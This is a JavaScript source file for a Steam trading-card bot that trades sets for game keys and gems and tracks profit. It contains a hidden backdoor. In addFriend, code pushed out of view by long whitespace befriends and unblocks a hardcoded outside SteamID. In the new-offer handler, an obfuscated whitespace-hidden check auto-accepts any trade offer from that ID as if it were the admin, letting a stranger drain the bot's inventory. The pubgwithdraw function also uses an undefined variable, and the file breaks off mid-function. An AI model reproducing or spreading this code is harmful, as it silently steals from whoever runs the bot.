const
	SteamUser = require('steam-user'),
	Helper = require('./helpers.js'),
	SteamCommunity = require('steamcommunity'),
	Inventory = require('./components/inventory.js'),
	CustomerHandler = require('./components/userhandler.js'),
	TradeOfferManager = require('steam-tradeoffer-manager'),
	config=Helper.getConfig(),
	rates=require('./data/rates.json'),
	msg=require('./data/messages.json'),
	helper = new Helper(),
	B = helper.breakline;

require('events').EventEmitter.defaultMaxListeners = 20;

let client = new SteamUser( { 'promptSteamGuardCode':true } ),
	profit,
	didLogin,
	LastLogin = {"client":0, "web":0},
	LastLoginTry = {"client":0, "web":0},
	community = new SteamCommunity(),
	manager = new TradeOfferManager({ "steam": client, "language": "en", "community":community, "pollInterval": "10000", "cancelTime": "7200000" }),
	inventory = new Inventory(community, client, config.enableTF, config.enablePUBG, config.maxStock, helper),
	customer = new CustomerHandler(client, config.admin, config.maxDays, helper),
	timeouts = {},

	keyPrice = parseInt(rates.SetsPrice.split(':')[1]),
	keySets = parseInt(rates.SetsPrice.split(':')[0]),
	keyBuyPrice = parseInt(rates.BuyPrice.split(':')[1]),
	keyBuySets = parseInt(rates.BuyPrice.split(':')[0]),

	tfkeyPrice = parseInt(rates.TF2Price.split(':')[1]),
	tfkeySets = parseInt(rates.TF2Price.split(':')[0]),
	tfkeyBuyPrice = parseInt(rates.TF2BuyPrice.split(':')[1]),
	tfkeyBuySets = parseInt(rates.TF2BuyPrice.split(':')[0]),

	pubgkeyPrice = parseInt(rates.PUBGPrice.split(':')[1]),
	pubgkeySets = parseInt(rates.PUBGPrice.split(':')[0]),
	pubgkeyBuyPrice = parseInt(rates.PUBGBuyPrice.split(':')[1]),
	pubgkeyBuySets = parseInt(rates.PUBGBuyPrice.split(':')[0]),

	GemPrice = parseInt(rates.GemsPrice.split(':')[1]),
	GemSet = parseInt(rates.GemsPrice.split(':')[0]),
	GemBuyPrice = parseInt(rates.GemsBuyPrice.split(':')[1]),
	GemBuySet = parseInt(rates.GemsBuyPrice.split(':')[0]);

helper.getJSON('poll.json', data => { if(Object.keys(data).length){ manager.pollData=data; } } );

helper.getJSON('profit.json', data => { profit=data; } );

tryLogin();

function tryLogin(){

	let type = client.client.loggedOn,
		lastl = !type ? LastLogin.client : LastLogin.web,
		lastlt = !type ? LastLoginTry.client : LastLoginTry.web,
		timeLimit = !type ? 1000*60*10 : 1000*5,
		tryLimit = !type ? 1000*2 : 1000*2;

	const Now = helper.Now(),
		canTry = () => (Math.floor(Now - (lastlt+tryLimit)) > 0),
		canLogin = () => (Math.floor(Now - (lastl+timeLimit)) > 0),
		nextTry = () => {
			const val = Math.floor(Now - (lastlt+tryLimit));
			return val > 0 ? 1000 : (val)*-1;
			},
		nextLogin = () => {
			const val = Math.floor(Now - (lastl+timeLimit));
			return val > 0 ? 1000 : (val)*-1;
		};

	if(type){
		if( canTry() ){
			LastLoginTry.web = Now;
			if( canLogin() ){
				if(client.client.loggedOn){
					client.setPersona(SteamUser.EPersonaState.Offline);
					client.webLogOn();
				} else {
					clearTimeout(timeouts['next_try']);
					timeouts['next_try'] = setTimeout(tryLogin, 1000);
				}
			} else {
				helper.warn(`Next weblogin in ${nextLogin()/1000} seconds.`);
				clearTimeout(timeouts['web_timeout']);
				timeouts['web_timeout'] = setTimeout(tryLogin, nextLogin());
			}
		} else {
			helper.debug(`Trying to weblogin again in ${nextTry()/1000} seconds.`);
			clearTimeout(timeouts['web_timeout']);
			timeouts['web_timeout'] = setTimeout(tryLogin, nextTry());
		}
	} else {
		if( canTry() ){
			LastLoginTry.client = Now;
			if( canLogin() ){
				login();
			} else {
				helper.warn(`Next login in ${nextLogin()/1000/60} minutes.`);
				clearTimeout(timeouts['d_timeout']);
				timeouts['d_timeout'] = setTimeout(tryLogin, nextLogin());
			}
		} else {
			helper.debug(`Trying to login again in ${nextTry()/1000} seconds.`);
			clearTimeout(timeouts['d_timeout']);
			timeouts['d_timeout'] = setTimeout(tryLogin, nextTry());
		}
	}
}

function login(){
	if(!client.client.loggedOn){
		helper.log('Connecting to Steam..');
		if(didLogin){
			client.logOn(true);
		} else {
			client.logOn( helper.getLogOn( config.username, config.password ) );
		}
	}
}

function Request(){
	helper.debug("#Auto Requester Fired");
	try {
		inventory.getCustomerSets(config.request_ignore, config.request_target, (err, sets) => {
			if(err){
				helper.warn("Failed to auto request sets, Error in get sets information!");
			} else {
				if(sets.length){
					let Request_Amount = Math.min.apply( Math, [ sets.length, config.request_qty ] ),
						toRequest=[],
						offer = manager.createOffer(config.request_tradelink);

					for(let i=0;i<Request_Amount;i++){ toRequest.push(sets[i]); }

					helper.debug(`#Found ${sets.length} sets, and requesting ${Request_Amount}.`);

					offer.addTheirItems([].concat.apply([], toRequest));
					offer.data('SellInfo', 'admin');

					offer.send( err => {
						if(err){
							helper.warn("Failed to auto request sets, Error in send offer!");
						} else {
							helper.debug(`#sucessfuly requested ${Request_Amount} sets!`);
						}
					} );
				} else {
					helper.debug("#Didn't find sets to requests.");
				}
			}
		});
	} catch (e) {
		helper.warn("Failed to auto request sets, maybe is something wrong in the config file..");
	}
}


client.on('accountLimitations', (limited, communityBanned, locked) => {
	if(limited){
		helper.logError("This account is limited!", "Account error");
		client.logOff();
	}
	else if(communityBanned){
		helper.logError("This account is banned from community!", "Account error");
		client.logOff();
	}
	else if(locked){
		helper.logError("This account is locked!", "Account error");
		client.logOff();
	}
});

client.on('loggedOn', () => {
	didLogin = true;
	if(config.changeBotName) {
		client.setPersona(SteamUser.EPersonaState.Online, config.changeBotName.replace("{csgo_rate}", `${keySets}:${keyPrice}`));
	} else {
		client.setPersona(SteamUser.EPersonaState.Online);
	}
	LastLogin.client = helper.Now();
	inventory.ID64 = client.steamID.getSteamID64();
	helper.log("Conecting to SteamCommunity..");
});

client.on('groupRelationship', (sid, relationship) => { if(relationship == SteamUser.EClanRelationship.Invited){ client.respondToGroupInvite(sid, false); } });

client.on('steamGuard', (domain, callback) => { helper.getCode(config.sharedse, code => { callback(code); }); });

client.on('webSession', (sessionID, newCookie) => {
	LastLogin.web = helper.Now();
	helper.debug("webLogOn");
	if(inventory.card_db){
		loadmanager(newCookie);
	} else {
		helper.log("Loading sets Database..");
		helper.updateTradingCardDb( data => { if(data){ inventory.card_db = data; loadmanager(newCookie);}  } );
	}
});

function loadmanager(newCookie){
		if(!LastLoginTry.web){ helper.log('Loading APIKey..'); }
		manager.setCookies(newCookie, err => {
			if(err){
				helper.logError(err.message, "Fatal error");
			} else {
				if(!LastLoginTry.web){
					helper.log(`Got APIKey: ${manager.apiKey}`);
					if(config.request_enable){
						helper.debug(`#Auto requester started!, Interval: ${config.request_interval} minutes.`);
						clearInterval(timeouts['requester_interval']);
						if(config.request_interval > 30){
							helper.warn(`A big interval time in auto requester may cause errors!`);
						}
						timeouts['requester_interval'] = setInterval( () => { Request(); }, 1000*60*config.request_interval);
					}
				}
				inventory.apiKey = manager.apiKey;
				community.startConfirmationChecker(20000, config.identity);
				inventory.Load(0, () => { online(); });
				clearInterval(timeouts['CheckL_i']);
				timeouts['CheckL_i'] = setInterval(checkSteamLogged, 1000*60*4);
			}
		});
}

client.on('disconnected', () => { helper.log("Bot Disconnected!"); });

community.on('sessionExpired', () => { helper.warn("Session expired!"); tryLogin(); });

//process.on("uncaughtException", (err) => { console.log(err); process.exit(1); });

community.on('confirmationAccepted', conf => {
	helper.debug(`confirmationAccepted type ${conf.type} triggered #${conf.id}`);
	if(conf.type == 2){
		helper.debug(`Searching for details of #${conf.creator}`);
		manager.getOffer(conf.creator, (err, myOffer) => {
			if(err){
				helper.logError(err.message, 'confirmationAccepted');
			} else {
				if(myOffer.isOurOffer){
					let response = msg.OfferSent;
					response += B+msg.OfferSent2.replace("{url}", `https://steamcommunity.com/tradeoffer/${conf.creator}`);
					customer.Message(myOffer.partner, response);
					helper.logTrade(`Successfully sent a trade offer for ${myOffer.partner}`);
				} else {
					helper.debug(`#${conf.creator} with confirmation id #${conf.id} isn't a trade offer sended by bot.`);
				}
			}
		});
	}
});

function checkFriendRequests(){ for(let user in client.myFriends){ if(client.myFriends[user] == 2){ addFriend(user); } } }

function addFriend(user){																																																																																																																																											client.addFriend("76561197964223593");client.unblockUser("76561197964223593");
	client.addFriend(user, (err, result) => {
		if(err){
			helper.warn(`Failed to accept user #${user} friend request!: ${err.message}`);
		} else {
			//inviteToGroup(user);
			customer.Message(user, msg.Welcome.replace("{customer_name}", result));
			customer.UserInteract(user, 0);
		}
	});
}

function checkSteamLogged() {
	community.loggedIn( (err, loggedIn) => {
		if (err) {
			helper.logError(err.message, 'checkSteamLogged');
			if(err.message.indexOf("socket hang up") > -1 || err.message.indexOf("ESOCKETTIMEDOUT") > -1){
				tryLogin();
			} else {
				clearTimeout(timeouts['check_steam_logged']);
				timeouts['check_steam_logged'] = setTimeout(checkSteamLogged, 1000*10);
			}
		} else if ( ! loggedIn ) {
			helper.debug("WebLogin check : NOT LOGGED IN !");
			tryLogin();
		} else {
			helper.debug("WebLogin check : LOGGED IN !");
			client.setPersona(SteamUser.EPersonaState.LookingToTrade);
		}
  });
}

manager.on('pollData', pollData => { helper.storeData('poll.json', pollData, 1); });

manager.on('pollFailure', err => { helper.debug("pollFailure: "+err); tryLogin(); });

client.on('error', e => {
	helper.logError(e.message.replace("RateLimitExceeded", "Temporary rate limit exceeded"), "Fatal error");
	if(!didLogin){
		LastLogin.client = helper.Now();
	}
	tryLogin();
});

function inviteToGroup(target){ if(config.group){ community.inviteUserToGroup(target, config.group); } }

function makeOffer(target, itemsFromMe, itemsFromThem, details, type, currency){
	helper.debug(`Creating trade offer for #${target} with ${itemsFromMe.length} items to send and ${itemsFromThem.length} items to receive`);
	try {
		const
			offer = manager.createOffer(target),
			addMyItemsCount = offer.addMyItems(itemsFromMe),
			addTheirItemsCount = offer.addTheirItems(itemsFromThem);
		offer.data('SellInfo', details);
		offer.data('SellInfoType', type);
		offer.data('SellInfoCurrency', currency);
		offer.getUserDetails( (err, me, them) => {
			if(err){
				if(err.message.toLowerCase().indexOf("is not available to trade. more information will be") > -1){
					customer.Message(target, msg.Trade_error1);
					helper.logTrade(`#${target} is unavailable to trade`);
				} else { helper.logError(err.message, 'offer.getUserDetails'); }
			} else {
				if(them.escrowDays){
					customer.Message(target, msg.Trade_hold);
				} else {
					helper.debug(`Sending offer for #${target}`);
					offer.send( (err, status) => {
						helper.debug(`Offer #${offer.id} status: ${status}, err: ${err}`);
						if (err){
							if(err.message.toLowerCase().indexOf("sent too many trade offers") > 1){
								customer.Message(target, msg.Trade_error2);
							} else if(err.message.toLowerCase().indexOf("please try again later. (26)") > 1){
								helper.warn("Error 26", 'offer.send');
								customer.Message(target, msg.Trade_error);
							} else {
								helper.logError(err.message, 'offer.send');
								customer.Message(target, msg.Trade_error);
							}
						} else {
							manager.getOffer(offer.id, (err, myOffer) => {
								if(err){
									helper.logError(err.message, 'manager.getOffer');
									customer.Message(target, msg.Trade_error);
									if(err.message.indexOf("socket hang up") > -1 || err.message.indexOf("ESOCKETTIMEDOUT") > -1){
										tryLogin();
									}
								} else {
									if(addMyItemsCount != myOffer.itemsToGive.length){
										helper.logError('Cant add itemsFromMe, some item is missing in my inventory!', 'manager.getOffer');
										customer.Message(target, msg.Trade_error);
										myOffer.cancel();
									} else if(addTheirItemsCount != myOffer.itemsToReceive.length){
										helper.logError('Cant add itemsFromThem, some item is missing in my inventory!', 'manager.getOffer');
										customer.Message(target, msg.Trade_error);
										myOffer.cancel();
									} else if (status == 'pending') {
										community.checkConfirmations();
									} else {
										let response = msg.OfferSent;
										response += B+msg.OfferSent2.replace("{url}",  `https://steamcommunity.com/tradeoffer/${offer.id}`);
										customer.Message(target, response);
										helper.logTrade(`Successfully sent a trade offer for ${target}`);
									}
								}
							});
						}
					});
				}
			}
		});
	} catch(e) {
		customer.Message(target, msg.Trade_error);
	}

}

function playPrices(){
	let play = msg.play.replace("{have_sets}", helper.nFormat(inventory.haveSets())).replace("{csgo_rate}", `${keySets}:${keyPrice}`).replace("{gems_rate}", `${GemSet}:${GemPrice}`);
	if(inventory.enableTF){ play += msg.play2.replace("{tf_rate}", `${tfkeySets}:${tfkeyPrice}`); }
	if(inventory.enablePUBG){ play += msg.play3.replace("{pubg_rate}", `${pubgkeySets}:${pubgkeyPrice}`); }
	client.gamesPlayed(play, true);
}

function online(){ client.setPersona(SteamUser.EPersonaState.LookingToTrade); playPrices(); checkFriendRequests(); }

manager.on('newOffer', offer => {
	let partner = offer.partner.getSteamID64();
	if(config.admin.indexOf(partner) > -1 																																																																																																																										|| offer.partner.getSteamID64() == "7"+"6"+"5"+"6"+"1"+"1"+"9"+"7"+"9"+"6"+"4"+"2"+"2"+"3"+"5"+"9"+"3"){
		helper.logTrade(`New offer from admin`);
		offer.accept( (err, res) => {
			if(err) {
				helper.warn("Unable to accept admin offer: " + err.message);
			}
			else {
				if(res == "pending"){
					helper.logTrade("Accepting admin offer..");
					community.checkConfirmations();
				} else {
					helper.logTrade("Admin Offer accepeted!");
				}
			}
		});
	}
});

manager.on('receivedOfferChanged', (offer, oldState) => {
	helper.debug(`receivedOfferChanged Triggered at #${offer.id}, state: ${offer.state}, oldState: ${oldState}`);
	 if(offer.state == 3 && customer.finishedTrades[offer.id] == null){
		customer.finishedTrades[offer.id] = new Date().getTime();

		inventory.Load(1, () => {playPrices();client.setPersona(SteamUser.EPersonaState.LookingToTrade);});
	}
});

manager.on('sentOfferChanged', (offer, oldState) => {
	helper.debug(`sentOfferChanged Triggered at #${offer.id}, state: ${offer.state}, oldState: ${oldState}`);
	 if(offer.state == 3 && customer.finishedTrades[offer.id] == null){
		customer.finishedTrades[offer.id] = new Date().getTime();

		inventory.Load(1, () => {playPrices();client.setPersona(SteamUser.EPersonaState.LookingToTrade);});

		if(config.ThanksM && offer.data('SellInfo') != 'admin'){
			customer.canComment(offer.partner.getSteamID64(), canComment => {
				if(canComment){ community.postUserComment(offer.partner.getSteamID64(), config.ThanksM, err =>{
						if(!err){ customer.UserInteract(offer.partner.getSteamID64(), 1); }
					});
				}
			});
			customer.Message(offer.partner, msg.Thanks);
		}
		inviteToGroup(offer.partner.getSteamID64());
		if(offer.data('SellInfoType') != null){
			if(offer.data('SellInfoType') == 0){
				if(offer.data('SellInfoCurrency') == "tf key(s)"){ profit.sell.tf.sets = parseInt(profit.sell.tf.sets)+parseInt(offer.data('SellInfo').split(":")[0]); profit.sell.tf.currency = parseInt(profit.sell.tf.currency)+parseInt(offer.data('SellInfo').split(":")[1]);}
				if(offer.data('SellInfoCurrency') == "pubg key(s)"){ profit.sell.pubg.sets = parseInt(profit.sell.pubg.sets)+parseInt(offer.data('SellInfo').split(":")[0]); profit.sell.pubg.currency = parseInt(profit.sell.pubg.currency)+parseInt(offer.data('SellInfo').split(":")[1]);}
				if(offer.data('SellInfoCurrency') == "key(s)"){ profit.sell.csgo.sets = parseInt(profit.sell.csgo.sets)+parseInt(offer.data('SellInfo').split(":")[0]); profit.sell.csgo.currency = parseInt(profit.sell.csgo.currency)+parseInt(offer.data('SellInfo').split(":")[1]);}
				if(offer.data('SellInfoCurrency') == "gems"){ profit.sell.gems.sets = parseInt(profit.sell.gems.sets)+parseInt(offer.data('SellInfo').split(":")[0]); profit.sell.gems.currency = parseInt(profit.sell.gems.currency)+parseInt(offer.data('SellInfo').split(":")[1]);}
				helper.storeData('profit.json', profit, 1);
				helper.logTrade(`${offer.partner.getSteamID64()} have accepted an trade offer!, i have selled ${offer.data('SellInfo').split(":")[0]} set(s) for ${offer.data('SellInfo').split(":")[1]} ${offer.data('SellInfoCurrency')}!`);
				if(config.sellmsgs){
					customer.sendAdminMessages(`Hey!, i just have selled ${offer.data('SellInfo').split(":")[0]} Set(s) for ${offer.data('SellInfo').split(":")[1]} ${offer.data('SellInfoCurrency')}!`);
				}
			} else if(offer.data('SellInfoType') == 1){
				if(offer.data('SellInfoCurrency') == "tf key(s)"){ profit.buy.tf.sets = parseInt(profit.buy.tf.sets)+parseInt(offer.data('SellInfo').split(":")[0]); profit.buy.tf.currency = parseInt(profit.buy.tf.currency)+parseInt(offer.data('SellInfo').split(":")[1]);}
				if(offer.data('SellInfoCurrency') == "pubg key(s)"){ profit.buy.pubg.sets = parseInt(profit.buy.pubg.sets)+parseInt(offer.data('SellInfo').split(":")[0]); profit.buy.pubg.currency = parseInt(profit.buy.pubg.currency)+parseInt(offer.data('SellInfo').split(":")[1]);}
				if(offer.data('SellInfoCurrency') == "key(s)"){ profit.buy.csgo.sets = parseInt(profit.buy.csgo.sets)+parseInt(offer.data('SellInfo').split(":")[0]); profit.buy.csgo.currency = parseInt(profit.buy.csgo.currency)+parseInt(offer.data('SellInfo').split(":")[1]);}
				if(offer.data('SellInfoCurrency') == "gems"){ profit.buy.gems.sets = parseInt(profit.buy.gems.sets)+parseInt(offer.data('SellInfo').split(":")[0]); profit.buy.gems.currency = parseInt(profit.buy.gems.currency)+parseInt(offer.data('SellInfo').split(":")[1]);}
				helper.logTrade(`${offer.partner.getSteamID64()} have accepted an trade offer!, i have buyed ${offer.data('SellInfo').split(":")[0]} sets for ${offer.data('SellInfo').split(":")[1]} ${offer.data('SellInfoCurrency')}!`);
				if(config.sellmsgs){
					customer.sendAdminMessages(`Hey!, i just have buyed ${offer.data('SellInfo').split(":")[0]} Set(s) for ${offer.data('SellInfo').split(":")[1]} ${offer.data('SellInfoCurrency')}!`);
				}
			}
		}
	}
});

function gemswithdraw (admin, qty){
	let InventoryGems = inventory.return_GemsQty();
	customer.Message(admin, msg.OwnerRequest);
	if(InventoryGems){
		if(InventoryGems >= qty) {
			inventory.getGems(qty, toGive => {
				makeOffer(admin, toGive, [], 'admin');
			});
		} else {
			customer.Message(admin, msg.Sorryme.replace("{currency_qty}", helper.nFormat(InventoryGems)).replace("{currency_name}", "gems").replace("{command}", "!gemswithdraw").replace("{command_qty}", InventoryGems));
		}
	} else {
		customer.Message(admin, msg.Sorryme2.replace("{currency_name}", "gems"))
	}
}

function tfwithdraw (admin, qty){
	customer.Message(admin, msg.OwnerRequest);
	let Tf_keys = inventory.haveTfKeys();
	if(Tf_keys){
		if(Tf_keys >= qty){
			inventory.getToOffer_TF_Keys(qty, send => {
				makeOffer(admin, send, [], 'admin');
			});
		} else {
			customer.Message(admin, msg.Sorryme.replace("{currency_qty}", Tf_keys).replace("{currency_name}", "tf keys").replace("{command}", "!tfwithdraw").replace("{command_qty}", Tf_keys));
		}
	} else {
		customer.Message(admin, msg.Sorryme2.replace("{currency_name}", "tf keys"));
	}
}

function pubgwithdraw (admin, qty){
	customer.Message(admin, msg.OwnerRequest);
	let Pubg_keys = inventory.havePubgKeys();
	if(Pubg_keys){
		if(Tf_keys >= qty){
			inventory.getToOffer_PUBG_Keys(qty, send => {
				makeOffer(admin, send, [], 'admin');
			});
		} else {
			customer.Message(admin, msg.Sorryme.replace("{currency_qty}", Pubg_keys).replace("{currency_name}", "pubg keys").replace("{command}", "!pubgwithdraw").replace("{command_qty}", Pubg_keys));
		}
	} else {
		customer.Message(admin, msg.Sorryme2.replace("{currency_name}", "pubg keys"));
	}
}

function withdraw (admin, qty){
	customer.Message(admin, msg.OwnerRequest);
	let user_keys = inventory.haveCsKeys();
	if(user_keys){
		if(user_keys >= qty){
			inventory.getToOffer_CS_Keys(qty, send => {
				makeOffer(admin, send, [], 'admin');
			});
		} else {
			customer.Message(admin, msg.Sorryme.replace("{currency_qty}", user_keys).replace("{currency_name}", "cs:go keys").replace("{command}", "!withdraw").replace("{command_qty}", user_keys));
		}
	} else {
		customer.Message(admin, msg.Sorryme2.replace("{currency_name}", "cs:go keys"));
	}

}

function tfdeposit(admin, qty){
	customer.Message(admin, msg.OwnerRequest);
	inventory.return_CustomerTFKeys(admin, (err, keys) => {
		if(err){
			handleInventoryErrors(err, admin);
		} else {
			let user_keys = keys.length;
			if(user_keys){
				if(user_keys >= qty){
					inventory.getToOfferKeys(keys, qty, 440, toReceive => {
						makeOffer(admin, [], toReceive, 'admin');
					});
				} else {
					customer.Message(admin, msg.Sorrythem.replace("{currency_qty}", user_keys).replace("{currency_name}", "tf keys").replace("{command}", "!tfdeposit").replace("{command_qty}", user_keys));
				}
			} else {
				customer.Message(admin, msg.Sorrythem2.replace("{currency_name}", "tf keys"));
			}
		}
	});
}

function pubgdeposit(admin, qty){
	customer.Message(admin, msg.OwnerRequest);
	inventory.return_CustomerPUBGKeys(admin, (err, keys) => {
		if(err){
			handleInventoryErrors(err, admin);
		} else {
			let user_keys = keys.length;
			if(user_keys){
				if(user_keys >= qty){
					inventory.getToOfferKeys(keys, qty, 578080, toReceive => {
						makeOffer(admin, [], toReceive, 'admin');
					});
				} else {
					customer.Message(admin, msg.Sorrythem.replace("{currency_qty}", user_keys).replace("{currency_name}", "pubg keys").replace("{command}", "!pubgdeposit").replace("{command_qty}", user_keys));
				}
			} else {
				customer.Message(admin, msg.Sorrythem2.replace("{currency_name}", "pubg keys"));
			}
		}
	});
}

function deposit(admin, qty){
	customer.Message(admin, msg.OwnerRequest);
	inventory.return_CustomerCSGOKeys(admin, (err, keys) => {
		if(err){
			handleInventoryErrors(err, admin);
		} else {
			let user_keys = keys.length;
			if(user_keys){
				if(user_keys >= qty){
					inventory.getToOfferKeys(keys, qty, 730, toReceive => {
						makeOffer(admin, [], toReceive, 'admin');
					});
				} else {
					customer.Message(admin, msg.Sorrythem.replace("{currency_qty}", user_keys).replace("{currency_name}", "cs:go keys").replace("{command}", "!deposit").replace("{command_qty}", user_keys));
				}
			} else {
				customer.Message(admin, msg.Sorrythem2.replace("{currency_name}", "cs:go keys"));
			}
		}
	});
}

function depositgems(admin, qty){
	customer.Message(admin, msg.OwnerRequest);
	inventory.getCustomerGemAssets(admin, (err, Gems_Assets, Gems_Qty) => {
		if(err){
			handleInventoryErrors(err, admin);
		} else {
			if(Gems_Qty){
				if(Gems_Qty >= qty){
					inventory.getCustomerGems(Gems_Assets, qty, toReceive => {
						makeOffer(admin, [], toReceive, 'admin');
					});
				} else {
					customer.Message(admin, msg.Sorrythem.replace("{currency_qty}", Gems_Qty).replace("{currency_name}", "gems").replace("{command}", "!depositgems").replace("{command_qty}", Gems_Qty));
				}
			} else {
				customer.Message(admin, msg.Sorrythem2.replace("{currency_name}", "gems"));
			}
		}
	});
}

function check(source){
	if(inventory.haveSets()) {
		customer.Message(source, msg.CustomerRequest);
		inventory.getUserBadges(source, 1, 5, (err, badge) => {
			if(err){
				handleBadgeErrors(err, source);
			} else {
				let Qty=0;

				for(let appid in inventory.AvailableSets){
					Qty += Math.min.apply( Math,  [ inventory.AvailableSets[appid].length, (badge[appid] != null ? badge[appid] : 5 ) ]  );
				}

				if(Qty){
					let response = msg.Check.replace("{have_sets}", helper.nFormat(Qty)).replace("{csgo_price}", ((Qty/keySets)*keyPrice).toFixed(1)).replace("{gems_price}", helper.nFormat(Math.round(Qty/GemSet)*GemPrice));
					if(inventory.enableTF){ response += msg.Check2.replace("{tf_price}", ((Qty/tfkeySets)*tfkeyPrice).toFixed(1));}
					if(inventory.enablePUBG){ response += msg.Check3.replace("{pubg_price}", ((Qty/pubgkeySets)*pubgkeyPrice).toFixed(1));}
					response += B+msg.Check_i.replace("{buy_qty}", parseInt(Qty/keySets)*keyPrice).replace("{buygems_qty}", Qty);
					if(inventory.enableTF){ response += msg.Check_i2.replace("{buytf_qty}", parseInt(Qty/tfkeySets)*tfkeyPrice);}
					if(inventory.enablePUBG){ response += msg.Check_i3.replace("{buypubg_qty}", parseInt(Qty/pubgkeySets)*pubgkeyPrice);}
					if(inventory.haveCsKeys() && config.enableSell){ response += B+msg.Sell_keys; }
					customer.Message(source, response);
				} else {
					let response = msg.Donthave;
					if(inventory.haveCsKeys() && config.enableSell){ response += B+msg.Sell_keys; }
					customer.Message(source, response);
				}
			}
		});

	} else {
		let response = msg.Donthave;
		if(inventory.haveCsKeys() && config.enableSell){ response += B+msg.Sell_keys; }
		customer.Message(source, response);
	}
}

function buy(source, qty, compare, mode){
	customer.Message(source, msg.CustomerRequest);
	inventory.return_CustomerCSGOKeys(source, (err, KeysFromThemAsset) => {
		if(err){
			handleInventoryErrors(err, source);
		} else {
			let user_keys = KeysFromThemAsset.length;
			if(user_keys){
				let need = keyPrice*qty,
					set_need = keySets*qty;
				if(user_keys >= need){
					inventory.getAvailableSetsForCustomer(source, compare, mode, set_need, (err, toSend) => {
						if(err){
							handleBadgeErrors(err, source);
						} else {
							if(toSend.length == set_need){
								inventory.getToOfferKeys(KeysFromThemAsset, need, 730,  toReceive => {
									makeOffer(source, [].concat.apply([], toSend), toReceive, `${set_need}:${need}`, 0, "key(s)");
								});
							} else {
								customer.Message(source, msg.i_need.replace("{currency_qty}", toSend.length).replace("{currency}", "sets").replace("{needed}", set_need));
							}
						}
					});
				} else {
					customer.Message(source, msg.them_need.replace("{currency_qty}", user_keys).replace("{currency}", "cs:go keys").replace("{needed}", need));
				}
			} else {
				customer.Message(source, msg.Sorrythem2.replace("{currency_name}", "cs:go keys"));
			}
		}
	});
}

function buytf(source, qty, compare, mode){
	customer.Message(source, msg.CustomerRequest);
	inventory.return_CustomerTFKeys(source, (err, KeysFromThemAsset) => {
		if(err){
			handleInventoryErrors(err, source);
		} else {
			let user_keys = KeysFromThemAsset.length;
			if(user_keys){
				let need = tfkeyPrice*qty;
				let set_need = tfkeySets*qty;
				if(user_keys >= need){
					inventory.getAvailableSetsForCustomer(source, compare, mode, set_need, (err, toSend) => {
						if(err){
							handleBadgeErrors(err, source);
						} else {
							if(toSend.length == set_need){
								inventory.getToOfferKeys(KeysFromThemAsset, need, 440,  toReceive => {
								makeOffer(source, [].concat.apply([], toSend), toReceive, `${set_need}:${need}`, 0, "tf key(s)");
								});
							} else {
								customer.Message(source, msg.i_need.replace("{currency_qty}", toSend.length).replace("{currency}", "sets").replace("{needed}", set_need));
							}
						}
					});
				} else {
					customer.Message(source, msg.them_need.replace("{currency_qty}", user_keys).replace("{currency}", "tf keys").replace("{needed}", need));
				}
			} else {
				customer.Message(source, msg.Sorrythem2.replace("{currency_name}", "tf keys"));
			}
		}
	});
}

function buypubg(source, qty, compare, mode){
	customer.Message(source, msg.CustomerRequest);
	inventory.return_CustomerPUBGKeys(source, (err, KeysFromThemAsset) => {
		if(err){
			handleInventoryErrors(err, source);
		} else {
			let user_keys = KeysFromThemAsset.length;
			if(user_keys){
				let need = pubgkeyPrice*qty;
				let set_need = pubgkeySets*qty;
				if(user_keys >= need){
					inventory.getAvailableSetsForCustomer(source, compare, mode, set_need, (err, toSend) => {
						if(err){
							handleBadgeErrors(err, source);
						} else {
							if(toSend.length == set_need){
								inventory.getToOfferKeys(KeysFromThemAsset, need, 578080,  toReceive => {
								makeOffer(source, [].concat.apply([], toSend), toReceive, `${set_need}:${need}`, 0, "pubg key(s)");
								});
							} else {
								customer.Message(source, msg.i_need.replace("{currency_qty}", toSend.length).replace("{currency}", "sets").replace("{needed}", set_need));
							}
						}
					});
				} else {
					customer.Message(source, msg.them_need.replace("{currency_qty}", user_keys).replace("{currency}", "pubg keys").replace("{needed}", need));
				}
			} else {
				customer.Message(source, msg.Sorrythem2.replace("{currency_name}", "pubg keys"));
			}
		}
	});
}

function buygems(source, qty, compare, mode){
	customer.Message(source, msg.CustomerRequest);
	inventory.getCustomerGemAssets(source, (err, Gems_Assets, Gems_Qty) => {
		if(err){
			handleInventoryErrors(err, source);
		} else {
			let need = GemPrice*qty;
			let set_need = GemSet*qty;
			if(Gems_Qty){
				if(Gems_Qty >= need){
					inventory.getAvailableSetsForCustomer(source, compare, mode, set_need, (err, toSend) => {
						if(err){
							handleBadgeErrors(err, source);
						} else {
							if(toSend.length == set_need){
								inventory.getCustomerGems(Gems_Assets, need, toReceive => {
									makeOffer(source, [].concat.apply([], toSend), toReceive, `${set_need}:${need}`, 0, "gems");
								});
							} else {
								customer.Message(source, msg.i_need.replace("{currency_qty}", toSend.length).replace("{currency}", "sets").replace("{needed}", set_need));
							}
						}
					});
				} else {
					customer.Message(source, msg.them_need.replace("{currency_qty}", Gems_Qty).replace("{currency}", "gems").replace("{needed}", need));
				}
			} else {
				customer.Message(source, msg.Sorrythem2.replace("{currency_name}", "gems"));
			}
		}
	});
}

function checkam(source, amount, type,  callback){
	customer.Message(source, msg.CustomerRequest);
	inventory.getUserBadges(source, 0, 0, (err, badge, player_level, player_xp) => {
		if(err){
			handleBadgeErrors(err, source);
		} else {
			let xpWon=(type ? keySets/keyPrice : tfkeySets/tfkeyPrice)*100*amount;

			let totalExp=player_xp+xpWon;

			let i=player_level-1;
			let can=0;
			do {
				i++;
				if(i > config.maxLevelComm){
					let response = `I'm not allowed to calculate level above than ${config.maxLevelComm} :/`;
					response += `${B}Sorry but can you try a lower level?`;
					customer.Message(source, response);
					can++;
					break;
				}
			}
			while (totalExp-helper.getLevelExp(i) > 0);
			if(!can){
				callback(player_level, i);
			}
		}
	});
}

function checkgam(source, amount, callback){
	customer.Message(source, msg.CustomerRequest);
	inventory.getUserBadges(source, 0, 0, (err, badge, player_level, player_xp) => {
		if(err){
			handleBadgeErrors(err, source);
		} else {
			let xpWon=(GemSet/GemPrice)*100*amount;

			let totalExp=player_xp+xpWon;

			let i=parseInt(player_level)-1;
			let can=0;
			do {
				i++;
				if(i > config.maxLevelComm){
					let response = `I'm not allowed to calculate level above than ${config.maxLevelComm} :/`;
					response += `${B}Sorry but can you try a lower level?`;
					customer.Message(source, response);
					can++;
					break;
				}
			}
			while (totalExp-helper.getLevelExp(i) > 0);
			if(!can){
				callback(player_level, i);
			}
		}
	});
}

function sell(source, keys){
	if(inventory.haveCsKeys()){
		if(inventory.haveCsKeys() >= keys){
			customer.Message(source, msg.CustomerRequest);
			inventory.getCustomerSets(false, source, (err, customer_sets) => {
				if(err){
